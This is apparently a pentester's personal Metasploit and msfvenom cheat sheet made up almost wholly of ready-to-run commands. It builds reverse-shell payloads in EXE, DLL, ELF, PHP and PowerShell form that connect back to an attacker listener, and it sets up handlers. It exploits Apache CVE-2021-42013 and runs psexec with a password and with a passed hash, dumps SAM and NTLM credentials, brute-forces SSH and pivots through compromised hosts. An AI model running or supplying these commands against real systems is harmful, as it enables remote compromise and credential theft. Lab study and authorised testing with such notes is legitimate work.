> Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code.


Offensive Security's Free Metasploit Course
https://www.offsec.com/metasploit-unleashed/

MSFVenom Cheat Sheet
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

# MSFvenom
## Usage

#Shell_Access #Remote_Access

List payloads
```bash
msfvenom -l payloads
```

Creating a Windows executable reverse shell payload
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.69.123 LPORT=6969 -f exe -a x86 --platform Windows -o reverse_shell.exe
```

Creating a Windows executable with a non-staged TCP reverse shell payload
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.69.123 LPORT=443 -f exe -o nonstaged.exe
```

Creating a Windows executable with a staged TCP reverse shell payload 
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.69.123 LPORT=443 -f exe -o staged.exe
```
- To get a functional interactive command prompt, we can use Metasploit's multi/handler module

Generate meterpreter reverse TCP payload for python
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.69.123 LPORT=1990 -f python -b "\x00\x20" -v shellcode
```

Generate a PowerShell compatible payload
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.69.123 LPORT=443 -f powershell -v sc
```

Generate PHP reverse shell payload
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.69.123 LPORT=4444 -f raw > shell.php
```

Windows executable with a Meterpreter HTTPS reverse shell payload
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.69.123 LPORT=443 -f exe -o met.exe
```

Windows DLL with a reverse TCP shell payload
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.69.123 LPORT=4444 -f dll -o getpwned.dll
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.69.123 LPORT=6666 -f dll -o revshell2.dll
```

Linux reverse shell binary
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.69.123 LPORT=4444 -f elf > shell-x64.elf
```

Linux `nc` reverse shell bash oneliner
```
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.69.123 lport=8888 R
```

# MSFconsole

## Usage

Setting up a handler for the meterpreter payload
```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.69.123;set LPORT 443;run;"
```

Creating and initializing the Metasploit database
```bash
sudo msfdb init
```

Enabling the postgresql database service at boot time
```bash
sudo systemctl enable postgresql
```

Starting the Metasploit Framework
```bash
sudo msfconsole
```

Starting the Metasploit Framework without banner
```bash
sudo msfconsole -q
```

Confirming database connectivity once the Metasploit command-line interface is started
```msfconsole
db_status
```

List all previously-created workspaces
```msfconsole
workspace
```

Creating workspace "sussyworkspace"
```msfconsole
workspace -a sussyworkspace
```

Switch to a workspace
```msfconsole
workspace sussyworkspace
```

Deleting a Workspace
```msfconsole
workspace -d sussyworkspace
```

Help menu of MSF commands
```msfconsole
help
```

Show the categories of Metasploit's modules
```msfconsole
show -h
```

Listing all auxiliary modules
```msfconsole
show auxiliary
```

Search for modules E.g., All SMB auxiliary modules in Metasploit
```msfconsole
search type:auxiliary smb
```

Search for modules E.g., All post exploitation modules in Metasploit
```
search type:post platform:windows name:host
```

Search for modules E.g., UAC bypass 
```
search UAC
```

Activate a module
```msfconsole
use [module_name]
```

Load a module E.g., kiwi
```meterpreter
load kiwi
```

Displaying options of the smb_version module
```msfconsole
show options
```

Display all required options, but not yet set
```msfconsole
show missing
```

Setting the value of the option RHOSTS manually
```msfconsole
set RHOSTS 192.168.69.123
```

Clear the current value of RHOSTS we manually set
```msfconsole
unset RHOSTS
```

Setting RHOSTS in an automated fashion via the database results
```msfconsole
services -p 445 --rhosts
```
- Set RHOSTS to all discovered hosts with open port 445 by entering services

Launch the exploit module
```msfconsole
run
```

Start the exploit module in the context of a job
```msfconsole
run -j
```

List all currently active jobs
```msfconsole
jobs
```

Backgrounding a session in meterpreter
```meterpreter
CTRL + Z
y
```

List all currently active sessions
```meterpreter
sessions -l
```

Interacting with backgrounded session
```msfconsole
sessions -i 2
```

Kill a session in meterpreter
```meterpreter
sessions -k 2
```

Start a channel to interact with a system within a session in meterpreter
```meterpreter
shell
```

Backgrounding a channel in meterpreter
```meterpreter
CTRL + Z
y
```

List all active channels
```msfconsole
channel -l
```

Interacting with backgrounded channel
```msfconsole
channel -i 1
```

Show local directory in meterpreter
```meterpreter
lpwd
```

Change local directory in meterpreter
```meterpreter
lcd /home/kali/Downloads
```

Download file from the target system to the local directory E.g., /etc/passwd
```meterpreter
download /etc/passwd
```

Upload file on the target system
```meterpreter
upload /usr/bin/unix-privesc-check /tmp/
```
- Upload `unix-privesc-check` to `/tmp` on the target system
- If our target runs the Windows operating system, we need to escape the backslashes in the destination path with backslashes like `\\`

Search for a file E.g., anything with passwords
```meterpreter
search -f *passwords*
```

Display idle time from current user
```meterpreter
idletime
```

Display the user that the Meterpreter server is running as on the host
```meterpreter
getuid
```

Get one or more environment variable values
```meterpreter
getenv
```

Elevate privileges
```meterpreter
getsystem
```

Show list of running processes
```meterpreter
ps
```

Create a new process by specifying a command or program
```
execute -H -f notepad
```
- `-H` 
	- Create the process hidden from view
- `-f` 
	- Specify the command or program to run. E.g., `notepad`

Migrate our current process
```meterpreter
migrate 3692
```

Add a network route to session 1 reachable through the compromised host
```msfconsole
route add 172.20.69.0/24 1
```

Remove all routes
```msfconsole
route flush
```

Get a list of all discovered hosts up to this point
```msfconsole
hosts
```

Display the discovered services discovered services up to this point
```msfconsole
services
```

Filter discovered services discovered services up to this point
```msfconsole
services -p 8000
```

Displaying vulnerabilities identified by Metasploit up to this point
```msfconsole
vulns
```

Displaying all saved credentials of the database up to this point
```msfconsole
creds
```

Displaying all routes of the database up to this point
```
route print
```

## Resource Scripts
> Automate Metasploit by chaining together a series of Metasploit console commands and Ruby code

Create a resource script that starts a multi/handler listener for a non-staged Windows 64-bit Meterpreter payload 
`listener.rc`
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.100.69
set LPORT 443
set AutoRunScript post/windows/manage/migrate 
set ExitOnSession false
run -z -j
```
- Activate the multi/handler module
- Set the payload (`windows/meterpreter_reverse_https`) 
- Set the _LHOST_ and _LPORT_ options to fit our needs.
- Configure `AutoRunScript` option to automatically execute a module after a session was created
	- Use the _post/windows/manage/migrate_ module
		- Automatically launch a background _notepad.exe_ process and migrate to it
- Set ExitOnSession to _false_ to ensure that the listener keeps accepting new connections after a session is created.
- run -z -j
	- Run it as a job in the background

#File_Sharing 

## File Sharing

Download file from the target system to the local directory E.g., /etc/passwd
```meterpreter
download /etc/passwd
```

Upload file on the target system
```meterpreter
upload /usr/bin/unix-privesc-check /tmp/
```
- Upload `unix-privesc-check` to `/tmp` on the target system
- If our target runs the Windows operating system, we need to escape the backslashes in the destination path with backslashes like `\\`

#File_Searching 

## File Searching

Search for a file E.g., passwords
```meterpreter
search -f *passwords*
```

#Port_Scanning 

## Port Scanning

Using `db_nmap` to scan a host
```msfconsole
db_nmap
db_nmap -A 192.168.69.123
```

Using `auxiliary/scanner/portscan/tcp` to port scan the whole network
```msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.168.69.0/24
set PORTS 445,3389
run
```

#SMB_Enumeration #Vulnerability_Scanning 

## SMB Scanning

Enumerate SMB version
```msfconsole
use auxiliary/scanner/smb/smb_version
services -p 445 --rhosts
run
```

Displaying vulnerabilities identified by Metasploit
```msfconsole
vulns
```

#Password_Attacks #SSH 

## SSH Brute Force

Use Metasploit to perform a dictionary attack against SSH
Search for SSH auxiliary modules
```msfconsole
search type:auxiliary ssh
```

Use auxiliary/scanner/ssh/ssh_login
```msfconsole
use 15
```

Set options of _ssh_login_
```msfconsole
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME hentaisalesman
set RHOSTS 192.168.123.169
set RPORT 2222
```

Displaying all saved credentials of the database
```msfconsole
creds
```

#Shell_Access #Remote_Access

## Getting a Shell

Start reverse TCP handler
```msfconsole
use multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST 192.168.69.169
set LPORT 443
run
```

Start reverse HTTPS handler
```msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 192.168.69.123
set LPORT 443
run
```

#Vulnerability_Exploitation 

## Exploiting vulnerable applications and services

Exploiting Apache RCE (CVE-2021-42013)
```
use multi/http/apache_normalize_path_rce
set payload payload/linux/x64/shell_reverse_tcp
set SSL false
set RPORT 80
set RHOSTS 192.168.69.42
run
```

Using exploit/windows/smb/psexec module to get access
```msfconsole
use exploit/windows/smb/psexec
set SMBUser salesman
set SMBPass "BullsBearsBirdsBees1!"
set RHOSTS 172.168.69.169
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
run
```

#Windows_Privilege_Escalation 

## Privilege Escalation 

Elevate privileges
```meterpreter
getsystem
```

## Dumping hashes

Dumps the contents of the SAM database
```meterpreter
hashdump
```

Load a module in active meterpreter session E.g., Kiwi
```meterpreter
load kiwi
```

Retrieve LM and NTLM credentials using loaded kiwi module
```meterpreter
creds_msv
```

#Pass_the_Hash 

Pass NTLM hash using psexec module
```msfconsole
use exploit/windows/smb/psexec
set LHOST 192.168.123.169
set LPORT 4455
set RHOST 192.168.123.170
set RPORT 445
set SMBUser bestsalesadmin
set SMBPass 35b04b5bada5eead4a514414033b3469:413416b534144aac5513d2968adc4869
```

#Port_Forwarding 

## Starting a SOCKS5 proxy

Using the `autoroute` post-exploitation module to set up pivot routes through an existing Meterpreter session automatically
```msfconsole
use multi/manage/autoroute
set session 1
run
```

Setting up a SOCKS5 proxy using the `autoroute` module
- This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default. 
- Set the option SRVHOST to **127.0.0.1** and _VERSION_ to **5** in order to use SOCKS version 5.
```msfconsole
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```
- Configure `/etc/proxychains4.conf` after
	- `socks5  127.0.0.1 1080`

## Port Forward
UNTESTED
```
portfwd add -l 6969 -p 3389 -r 172.16.69.169
```